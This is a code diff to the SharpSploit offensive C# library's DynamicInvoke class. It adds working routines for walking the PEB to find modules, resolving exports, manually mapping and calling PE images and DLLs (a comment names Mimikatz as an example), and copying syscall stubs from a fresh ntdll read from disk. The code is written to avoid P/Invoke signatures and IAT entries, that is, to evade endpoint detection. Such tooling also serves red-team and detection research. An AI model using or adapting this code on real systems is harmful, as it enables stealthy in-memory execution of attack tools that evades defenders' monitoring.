@@ -6,6 +6,7 @@ using System;
 using System.IO;
 using System.Text;
 using System.Diagnostics;
+using System.Collections.Generic;
 using System.Security.Cryptography;
 using System.Runtime.InteropServices;
 
@@ -14,7 +15,7 @@ using Execute = SharpSploit.Execution;
 namespace SharpSploit.Execution.DynamicInvoke
 {
     /// <summary>
-    /// Generic is class for dynamically invoking arbitrary API calls from memory or disk. DynamicInvoke avoids suspicious
+    /// Generic is a class for dynamically invoking arbitrary API calls from memory or disk. DynamicInvoke avoids suspicious
     /// P/Invoke signatures, imports, and IAT entries by loading modules and invoking their functions at runtime.
     /// </summary>
     public class Generic
@@ -152,7 +153,9 @@ namespace SharpSploit.Execution.DynamicInvoke
         }
 
         /// <summary>
-        /// Helper for getting the base address of a module loaded by the current process. This base address could be passed to GetProcAddress/LdrGetProcedureAddress or it could be used for manual export parsing.
+        /// Helper for getting the base address of a module loaded by the current process. This base
+        /// address could be passed to GetProcAddress/LdrGetProcedureAddress or it could be used for
+        /// manual export parsing. This function uses the .NET System.Diagnostics.Process class.
         /// </summary>
         /// <author>Ruben Boonen (@FuzzySec)</author>
         /// <param name="DLLName">The name of the DLL (e.g. "ntdll.dll").</param>
@@ -167,8 +170,61 @@ namespace SharpSploit.Execution.DynamicInvoke
                     return Mod.BaseAddress;
                 }
             }
-
             return IntPtr.Zero;
+        }
+
+        /// <summary>
+        /// Helper for getting the base address of a module loaded by the current process. This base
+        /// address could be passed to GetProcAddress/LdrGetProcedureAddress or it could be used for
+        /// manual export parsing. This function parses the _PEB_LDR_DATA structure.
+        /// </summary>
+        /// <author>Ruben Boonen (@FuzzySec)</author>
+        /// <param name="DLLName">The name of the DLL (e.g. "ntdll.dll").</param>
+        /// <returns>IntPtr base address of the loaded module or IntPtr.Zero if the module is not found.</returns>
+        public static IntPtr GetPebLdrModuleEntry(string DLLName)
+        {
+            // Get _PEB pointer
+            Execute.Native.PROCESS_BASIC_INFORMATION pbi = Native.NtQueryInformationProcessBasicInformation((IntPtr)(-1));
+
+            // Set function variables
+            bool Is32Bit = false;
+            UInt32 LdrDataOffset = 0;
+            UInt32 InLoadOrderModuleListOffset = 0;
+            if (IntPtr.Size == 4)
+            {
+                Is32Bit = true;
+                LdrDataOffset = 0xc;
+                InLoadOrderModuleListOffset = 0xC;
+            }
+            else
+            {
+                LdrDataOffset = 0x18;
+                InLoadOrderModuleListOffset = 0x10;
+            }
+
+            // Get module InLoadOrderModuleList -> _LIST_ENTRY
+            IntPtr PEB_LDR_DATA = Marshal.ReadIntPtr((IntPtr)((UInt64)pbi.PebBaseAddress + LdrDataOffset));
+            IntPtr pInLoadOrderModuleList = (IntPtr)((UInt64)PEB_LDR_DATA + InLoadOrderModuleListOffset);
+            Execute.Native.LIST_ENTRY le = (Execute.Native.LIST_ENTRY)Marshal.PtrToStructure(pInLoadOrderModuleList, typeof(Execute.Native.LIST_ENTRY));
+
+            // Loop entries
+            IntPtr flink = le.Flink;
+            IntPtr hModule = IntPtr.Zero;
+            Execute.PE.LDR_DATA_TABLE_ENTRY dte = (Execute.PE.LDR_DATA_TABLE_ENTRY)Marshal.PtrToStructure(flink, typeof(Execute.PE.LDR_DATA_TABLE_ENTRY));
+            while (dte.InLoadOrderLinks.Flink != le.Blink)
+            {
+                // Match module name
+                if (Marshal.PtrToStringUni(dte.FullDllName.Buffer).EndsWith(DLLName, StringComparison.OrdinalIgnoreCase))
+                {
+                    hModule = dte.DllBase;
+                }
+            
+                // Move Ptr
+                flink = dte.InLoadOrderLinks.Flink;
+                dte = (Execute.PE.LDR_DATA_TABLE_ENTRY)Marshal.PtrToStructure(flink, typeof(Execute.PE.LDR_DATA_TABLE_ENTRY));
+            }
+
+            return hModule;
         }
 
         /// <summary>
@@ -377,6 +433,298 @@ namespace SharpSploit.Execution.DynamicInvoke
                 throw new MissingMethodException(FunctionHash + ", export hash not found.");
             }
             return FunctionPtr;
+        }
+
+        /// <summary>
+        /// Given a module base address, resolve the address of a function by calling LdrGetProcedureAddress.
+        /// </summary>
+        /// <author>Ruben Boonen (@FuzzySec)</author>
+        /// <param name="ModuleBase">A pointer to the base address where the module is loaded in the current process.</param>
+        /// <param name="ExportName">The name of the export to search for (e.g. "NtAlertResumeThread").</param>
+        /// <returns>IntPtr for the desired function.</returns>
+        public static IntPtr GetNativeExportAddress(IntPtr ModuleBase, string ExportName)
+        {
+            Execute.Native.ANSI_STRING aFunc = new Execute.Native.ANSI_STRING
+            {
+                Length = (ushort)ExportName.Length,
+                MaximumLength = (ushort)(ExportName.Length + 2),
+                Buffer = Marshal.StringToCoTaskMemAnsi(ExportName)
+            };
+
+            IntPtr pAFunc = Marshal.AllocHGlobal(Marshal.SizeOf(aFunc));
+            Marshal.StructureToPtr(aFunc, pAFunc, true);
+
+            IntPtr pFuncAddr = IntPtr.Zero;
+            Native.LdrGetProcedureAddress(ModuleBase, pAFunc, IntPtr.Zero, ref pFuncAddr);
+
+            Marshal.FreeHGlobal(pAFunc);
+
+            return pFuncAddr;
+        }
+
+        /// <summary>
+        /// Given a module base address, resolve the address of a function by calling LdrGetProcedureAddress.
+        /// </summary>
+        /// <author>Ruben Boonen (@FuzzySec)</author>
+        /// <param name="ModuleBase">A pointer to the base address where the module is loaded in the current process.</param>
+        /// <param name="Ordinal">The ordinal number to search for (e.g. 0x136 -> ntdll!NtCreateThreadEx).</param>
+        /// <returns>IntPtr for the desired function.</returns>
+        public static IntPtr GetNativeExportAddress(IntPtr ModuleBase, short Ordinal)
+        {
+            IntPtr pFuncAddr = IntPtr.Zero;
+            IntPtr pOrd = (IntPtr)Ordinal;
+
+            Native.LdrGetProcedureAddress(ModuleBase, IntPtr.Zero, pOrd, ref pFuncAddr);
+
+            return pFuncAddr;
+        }
+
+        /// <summary>
+        /// Retrieve PE header information from the module base pointer.
+        /// </summary>
+        /// <author>Ruben Boonen (@FuzzySec)</author>
+        /// <param name="pModule">Pointer to the module base.</param>
+        /// <returns>PE.PE_META_DATA</returns>
+        public static PE.PE_META_DATA GetPeMetaData(IntPtr pModule)
+        {
+            PE.PE_META_DATA PeMetaData = new PE.PE_META_DATA();
+            try
+            {
+                UInt32 e_lfanew = (UInt32)Marshal.ReadInt32((IntPtr)((UInt64)pModule + 0x3c));
+                PeMetaData.Pe = (UInt32)Marshal.ReadInt32((IntPtr)((UInt64)pModule + e_lfanew));
+                // Validate PE signature
+                if (PeMetaData.Pe != 0x4550)
+                {
+                    throw new InvalidOperationException("Invalid PE signature.");
+                }
+                PeMetaData.ImageFileHeader = (PE.IMAGE_FILE_HEADER)Marshal.PtrToStructure((IntPtr)((UInt64)pModule + e_lfanew + 0x4), typeof(PE.IMAGE_FILE_HEADER));
+                IntPtr OptHeader = (IntPtr)((UInt64)pModule + e_lfanew + 0x18);
+                UInt16 PEArch = (UInt16)Marshal.ReadInt16(OptHeader);
+                // Validate PE arch
+                if (PEArch == 0x010b) // Image is x32
+                {
+                    PeMetaData.Is32Bit = true;
+                    PeMetaData.OptHeader32 = (PE.IMAGE_OPTIONAL_HEADER32)Marshal.PtrToStructure(OptHeader, typeof(PE.IMAGE_OPTIONAL_HEADER32));
+                }
+                else if (PEArch == 0x020b) // Image is x64
+                {
+                    PeMetaData.Is32Bit = false;
+                    PeMetaData.OptHeader64 = (PE.IMAGE_OPTIONAL_HEADER64)Marshal.PtrToStructure(OptHeader, typeof(PE.IMAGE_OPTIONAL_HEADER64));
+                } else
+                {
+                    throw new InvalidOperationException("Invalid magic value (PE32/PE32+).");
+                }
+                // Read sections
+                PE.IMAGE_SECTION_HEADER[] SectionArray = new PE.IMAGE_SECTION_HEADER[PeMetaData.ImageFileHeader.NumberOfSections];
+                for (int i = 0; i < PeMetaData.ImageFileHeader.NumberOfSections; i++)
+                {
+                    IntPtr SectionPtr = (IntPtr)((UInt64)OptHeader + PeMetaData.ImageFileHeader.SizeOfOptionalHeader + (UInt32)(i * 0x28));
+                    SectionArray[i] = (PE.IMAGE_SECTION_HEADER)Marshal.PtrToStructure(SectionPtr, typeof(PE.IMAGE_SECTION_HEADER));
+                }
+                PeMetaData.Sections = SectionArray;
+            }
+            catch
+            {
+                throw new InvalidOperationException("Invalid module base specified.");
+            }
+            return PeMetaData;
+        }
+
+        /// <summary>
+        /// Resolve host DLL for API Set DLL.
+        /// </summary>
+        /// <author>Ruben Boonen (@FuzzySec)</author>
+        /// <returns>Dictionary, a combination of Key:APISetDLL and Val:HostDLL.</returns>
+        public static Dictionary<string, string> GetApiSetMapping()
+        {
+            Execute.Native.PROCESS_BASIC_INFORMATION pbi = Native.NtQueryInformationProcessBasicInformation((IntPtr)(-1));
+            UInt32 ApiSetMapOffset = IntPtr.Size == 4 ? (UInt32)0x38 : 0x68;
+
+            // Create mapping dictionary
+            Dictionary<string, string> ApiSetDict = new Dictionary<string, string>();
+
+            IntPtr pApiSetNamespace = Marshal.ReadIntPtr((IntPtr)((UInt64)pbi.PebBaseAddress + ApiSetMapOffset));
+            PE.ApiSetNamespace Namespace = (PE.ApiSetNamespace)Marshal.PtrToStructure(pApiSetNamespace, typeof(PE.ApiSetNamespace));
+            for (var i = 0; i < Namespace.Count; i++)
+            {
+                PE.ApiSetNamespaceEntry SetEntry = new PE.ApiSetNamespaceEntry();
+                SetEntry = (PE.ApiSetNamespaceEntry)Marshal.PtrToStructure((IntPtr)((UInt64)pApiSetNamespace + (UInt64)Namespace.EntryOffset + (UInt64)(i * Marshal.SizeOf(SetEntry))), typeof(PE.ApiSetNamespaceEntry));
+                string ApiSetEntryName = Marshal.PtrToStringUni((IntPtr)((UInt64)pApiSetNamespace + (UInt64)SetEntry.NameOffset), SetEntry.NameLength/2) + ".dll";
+
+                PE.ApiSetValueEntry SetValue = new PE.ApiSetValueEntry();
+                SetValue = (PE.ApiSetValueEntry)Marshal.PtrToStructure((IntPtr)((UInt64)pApiSetNamespace + (UInt64)SetEntry.ValueOffset), typeof(PE.ApiSetValueEntry));
+                string ApiSetValue = string.Empty;
+                if (SetValue.ValueCount != 0)
+                {
+                    ApiSetValue = Marshal.PtrToStringUni((IntPtr)((UInt64)pApiSetNamespace + (UInt64)SetValue.ValueOffset), SetValue.ValueCount/2);
+                }
+
+                // Add pair to dict
+                ApiSetDict.Add(ApiSetEntryName, ApiSetValue);
+            }
+
+            // Return dict
+            return ApiSetDict;
+        }
+
+        /// <summary>
+        /// Call a manually mapped PE by its EntryPoint.
+        /// </summary>
+        /// <author>Ruben Boonen (@FuzzySec)</author>
+        /// <param name="PEINFO">Module meta data struct (PE.PE_META_DATA).</param>
+        /// <param name="ModuleMemoryBase">Base address of the module in memory.</param>
+        /// <returns>void</returns>
+        public static void CallMappedPEModule(PE.PE_META_DATA PEINFO, IntPtr ModuleMemoryBase)
+        {
+            // Call module by EntryPoint (eg Mimikatz.exe)
+            IntPtr hRemoteThread = IntPtr.Zero;
+            IntPtr lpStartAddress = PEINFO.Is32Bit ? (IntPtr)((UInt64)ModuleMemoryBase + PEINFO.OptHeader32.AddressOfEntryPoint) :
+                                                     (IntPtr)((UInt64)ModuleMemoryBase + PEINFO.OptHeader64.AddressOfEntryPoint);
+
+            Native.NtCreateThreadEx(
+                ref hRemoteThread,
+                Execute.Win32.WinNT.ACCESS_MASK.STANDARD_RIGHTS_ALL,
+                IntPtr.Zero, (IntPtr)(-1),
+                lpStartAddress, IntPtr.Zero,
+                false, 0, 0, 0, IntPtr.Zero
+            );
+        }
+
+        /// <summary>
+        /// Call a manually mapped DLL by DllMain -> DLL_PROCESS_ATTACH.
+        /// </summary>
+        /// <author>Ruben Boonen (@FuzzySec)</author>
+        /// <param name="PEINFO">Module meta data struct (PE.PE_META_DATA).</param>
+        /// <param name="ModuleMemoryBase">Base address of the module in memory.</param>
+        /// <returns>void</returns>
+        public static void CallMappedDLLModule(PE.PE_META_DATA PEINFO, IntPtr ModuleMemoryBase)
+        {
+            IntPtr lpEntryPoint = PEINFO.Is32Bit ? (IntPtr)((UInt64)ModuleMemoryBase + PEINFO.OptHeader32.AddressOfEntryPoint) :
+                                                   (IntPtr)((UInt64)ModuleMemoryBase + PEINFO.OptHeader64.AddressOfEntryPoint);
+
+            PE.DllMain fDllMain = (PE.DllMain)Marshal.GetDelegateForFunctionPointer(lpEntryPoint, typeof(PE.DllMain));
+            bool CallRes = fDllMain(ModuleMemoryBase, PE.DLL_PROCESS_ATTACH, IntPtr.Zero);
+            if (!CallRes)
+            {
+                throw new InvalidOperationException("Failed to call DllMain -> DLL_PROCESS_ATTACH");
+            }
+        }
+
+        /// <summary>
+        /// Call a manually mapped DLL by Export.
+        /// </summary>
+        /// <author>Ruben Boonen (@FuzzySec)</author>
+        /// <param name="PEINFO">Module meta data struct (PE.PE_META_DATA).</param>
+        /// <param name="ModuleMemoryBase">Base address of the module in memory.</param>
+        /// <param name="ExportName">The name of the export to search for (e.g. "NtAlertResumeThread").</param>
+        /// <param name="FunctionDelegateType">Prototype for the function, represented as a Delegate object.</param>
+        /// <param name="Parameters">Arbitrary set of parameters to pass to the function. Can be modified if function uses call by reference.</param>
+        /// <returns>void</returns>
+        public static object CallMappedDLLModuleExport(PE.PE_META_DATA PEINFO, IntPtr ModuleMemoryBase, string ExportName, Type FunctionDelegateType, object[] Parameters)
+        {
+            CallMappedDLLModule(PEINFO, ModuleMemoryBase);
+
+            // Get export pointer
+            IntPtr pFunc = GetExportAddress(ModuleMemoryBase, ExportName);
+
+            // Call export
+            return DynamicFunctionInvoke(pFunc, FunctionDelegateType, ref Parameters);
+        }
+
+        /// <summary>
+        /// Read ntdll from disk, find/copy the appropriate syscall stub and free ntdll.
+        /// </summary>
+        /// <author>Ruben Boonen (@FuzzySec)</author>
+        /// <param name="FunctionName">The name of the function to search for (e.g. "NtAlertResumeThread").</param>
+        /// <returns>IntPtr, Syscall stub</returns>
+        public static IntPtr GetSyscallStub(string FunctionName)
+        {
+            // Verify process & architecture
+            bool isWOW64 = Native.NtQueryInformationProcessWow64Information((IntPtr)(-1));
+            if (IntPtr.Size == 4 && isWOW64)
+            {
+                throw new InvalidOperationException("Generating Syscall stubs is not supported for WOW64.");
+            }
+
+            // Find the path for ntdll by looking at the currently loaded module
+            string NtdllPath = string.Empty;
+            ProcessModuleCollection ProcModules = Process.GetCurrentProcess().Modules;
+            foreach (ProcessModule Mod in ProcModules)
+            {
+                if (Mod.FileName.EndsWith("ntdll.dll", StringComparison.OrdinalIgnoreCase))
+                {
+                    NtdllPath = Mod.FileName;
+                }
+            }
+
+            // Alloc module into memory for parsing
+            IntPtr pModule = Execute.ManualMap.Map.AllocateFileToMemory(NtdllPath);
+
+            // Fetch PE meta data
+            PE.PE_META_DATA PEINFO = GetPeMetaData(pModule);
+
+            // Alloc PE image memory -> RW
+            IntPtr BaseAddress = IntPtr.Zero;
+            IntPtr RegionSize = PEINFO.Is32Bit ? (IntPtr)PEINFO.OptHeader32.SizeOfImage : (IntPtr)PEINFO.OptHeader64.SizeOfImage;
+            UInt32 SizeOfHeaders = PEINFO.Is32Bit ? PEINFO.OptHeader32.SizeOfHeaders : PEINFO.OptHeader64.SizeOfHeaders;
+
+            IntPtr pImage = Native.NtAllocateVirtualMemory(
+                (IntPtr)(-1), ref BaseAddress, IntPtr.Zero, ref RegionSize,
+                Execute.Win32.Kernel32.MEM_COMMIT | Execute.Win32.Kernel32.MEM_RESERVE,
+                Execute.Win32.WinNT.PAGE_READWRITE
+            );
+
+            // Write PE header to memory
+            UInt32 BytesWritten = Native.NtWriteVirtualMemory((IntPtr)(-1), pImage, pModule, SizeOfHeaders);
+
+            // Write sections to memory
+            foreach (PE.IMAGE_SECTION_HEADER ish in PEINFO.Sections)
+            {
+                // Calculate offsets
+                IntPtr pVirtualSectionBase = (IntPtr)((UInt64)pImage + ish.VirtualAddress);
+                IntPtr pRawSectionBase = (IntPtr)((UInt64)pModule + ish.PointerToRawData);
+
+                // Write data
+                BytesWritten = Native.NtWriteVirtualMemory((IntPtr)(-1), pVirtualSectionBase, pRawSectionBase, ish.SizeOfRawData);
+                if (BytesWritten != ish.SizeOfRawData)
+                {
+                    throw new InvalidOperationException("Failed to write to memory.");
+                }
+            }
+
+            // Get Ptr to function
+            IntPtr pFunc = GetExportAddress(pImage, FunctionName);
+            if (pFunc == IntPtr.Zero)
+            {
+                throw new InvalidOperationException("Failed to resolve ntdll export.");
+            }
+
+            // Alloc memory for call stub
+            BaseAddress = IntPtr.Zero;
+            RegionSize = (IntPtr)0x50;
+            IntPtr pCallStub = Native.NtAllocateVirtualMemory(
+                (IntPtr)(-1), ref BaseAddress, IntPtr.Zero, ref RegionSize,
+                Execute.Win32.Kernel32.MEM_COMMIT | Execute.Win32.Kernel32.MEM_RESERVE,
+                Execute.Win32.WinNT.PAGE_READWRITE
+            );
+
+            // Write call stub
+            BytesWritten = Native.NtWriteVirtualMemory((IntPtr)(-1), pCallStub, pFunc, 0x50);
+            if (BytesWritten != 0x50)
+            {
+                throw new InvalidOperationException("Failed to write to memory.");
+            }
+
+            // Change call stub permissions
+            Native.NtProtectVirtualMemory((IntPtr)(-1), ref pCallStub, ref RegionSize, Execute.Win32.WinNT.PAGE_EXECUTE_READ);
+
+            // Free temporary allocations
+            Marshal.FreeHGlobal(pModule);
+            RegionSize = PEINFO.Is32Bit ? (IntPtr)PEINFO.OptHeader32.SizeOfImage : (IntPtr)PEINFO.OptHeader64.SizeOfImage;
+
+            Native.NtFreeVirtualMemory((IntPtr)(-1), ref pImage, ref RegionSize, Execute.Win32.Kernel32.MEM_RELEASE);
+
+            return pCallStub;
         }
     }
 }
